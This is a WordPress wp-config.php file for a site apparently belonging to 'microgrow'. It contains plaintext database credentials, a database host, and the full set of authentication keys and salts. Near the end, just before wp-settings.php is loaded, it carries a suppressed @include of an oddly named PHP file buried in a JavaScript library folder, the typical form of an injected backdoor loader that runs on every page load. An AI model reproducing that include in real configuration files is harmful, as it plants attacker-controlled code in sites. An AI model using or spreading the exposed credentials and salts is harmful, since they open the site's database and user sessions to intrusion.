<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'mgwordpress');

/** MySQL database username */
define('DB_USER', 'microgrow2016');

/** MySQL database password */
define('DB_PASSWORD', 'growlink6811');

/** MySQL hostname */
define('DB_HOST', 'mysql-mgwordpress.microgrow.com');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'p){m-$tBYK}6[q0deBmN& %g-AQ,_sfT>f7)dm,F6$9B_.5!=e1^f?:|VA+6 kyq');
define('SECURE_AUTH_KEY',  '.MMuzRS{6u yN209&|CV[4cB4gxy.jP-w%D+DYF@BpQ|%JyqV4i3x8%fZpm/i#oE');
define('LOGGED_IN_KEY',    '~_m 0?tv3#h1F9=}}TAv:s *#9w)|Y+3(f.zkZ+n+xyZ7cZQwq1<KpuJ~mVtiSs_');
define('NONCE_KEY',        '}mDBSNR6LIN^sI8bKdX||bU#-7mc6l-Lx&72?|I+q eRqMSPJZI{|`hP<w{Zg;bz');
define('AUTH_SALT',        'V0[R2 l^OuX}1QddFkbW@8r7Sbq>Rq{Q|+9(AE)Zcv-&![4%%UgwkQu~ IK0wD~*');
define('SECURE_AUTH_SALT', 'GE|aH%qL)ZW#V9|VFnVrF^kh?TL[4kQpLoZlO9RzC-:[Q)7cm3&j0$Y3y:6] NKx');
define('LOGGED_IN_SALT',   '{%ECUfZR|2~|Ne;]HHV-W[Mr2GtJ)9KVYJw|E-(7-FlJ!N[x>G[1)s9OJ^VN0A@m');
define('NONCE_SALT',       'T,o@|&fF=mmQX;E>NSxJ--Rq[)=Hzk-zfeAY:cOBrD;=G 0|/~~p9eskm*Bl8dV-');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_mg_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
@include('wp-includes/js/jcrop/htm1/e1111176.php');
require_once(ABSPATH . 'wp-settings.php');